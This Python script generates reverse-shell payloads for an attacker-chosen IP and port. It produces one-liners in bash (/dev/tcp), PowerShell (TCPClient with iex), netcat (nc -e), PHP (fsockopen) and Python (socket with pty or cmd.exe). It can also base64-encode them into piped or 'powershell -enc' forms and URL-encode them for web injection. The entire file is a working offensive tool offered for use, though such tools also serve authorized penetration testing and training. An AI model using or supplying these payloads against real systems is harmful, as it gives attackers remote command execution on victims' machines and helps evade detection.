import argparse
import base64
import urllib.parse

parser = argparse.ArgumentParser()

parser.add_argument("ip", type=str)
parser.add_argument("port", type=str)
parser.add_argument("-l", "--language", default='bash')
parser.add_argument("-b", "--base64", action='store_true')
parser.add_argument("-u", "--url-encode", action='store_true')
parser.add_argument("-o", "--os", default='linux')

args = parser.parse_args()

print(args)
ip = args.ip
port = args.port
if args.language == 'bash':    
    reverseshell = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    
    if args.base64:        
        base64_reverseshell = 'echo '
        base64_reverseshell += base64.b64encode(reverseshell.encode()).decode()
        base64_reverseshell += ' | base64 -d'
        base64_reverseshell += ' | bash'
        reverseshell = base64_reverseshell
        
     
elif args.language == 'powershell':
    reverseshell = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    
    if args.base64:
        base64_reverseshell = 'powershell -enc '
        base64_reverseshell += base64.b64encode(reverseshell.encode('utf_16_le')).decode()
        reverseshell = base64_reverseshell
        

elif args.language == 'nc':
    reverseshell = f'nc -e sh {ip} {port}'    
    
    if args.base64:
        base64_reverseshell = 'echo '
        base64_reverseshell += base64.b64encode(reverseshell.encode()).decode()
        base64_reverseshell += ' | base64 -d'
        base64_reverseshell += ' | sh'
        reverseshell = base64_reverseshell
        
        
elif args.language == 'php':
    reverseshell = f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''    
    
    if args.base64:
        base64_reverseshell = 'echo '
        base64_reverseshell += base64.b64encode(reverseshell.encode()).decode()
        base64_reverseshell += ' | base64 -d'
        base64_reverseshell += ' | sh'
        reverseshell = base64_reverseshell

        
elif args.language == 'python':    
    if args.os == 'windows':
        reverseshell = f'python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{ip}\',{port}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"'
    else:
        reverseshell = f'python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("sh")\''
                      
    if args.base64:
        base64_reverseshell = 'echo '
        base64_reverseshell += base64.b64encode(reverseshell.encode()).decode()
        base64_reverseshell += ' | base64 -d'
        base64_reverseshell += ' | sh'
        reverseshell = base64_reverseshell        

        
if args.url_encode:
    reverseshell = urllib.parse.quote(reverseshell)

print('----------------------------------------------')
print(reverseshell)

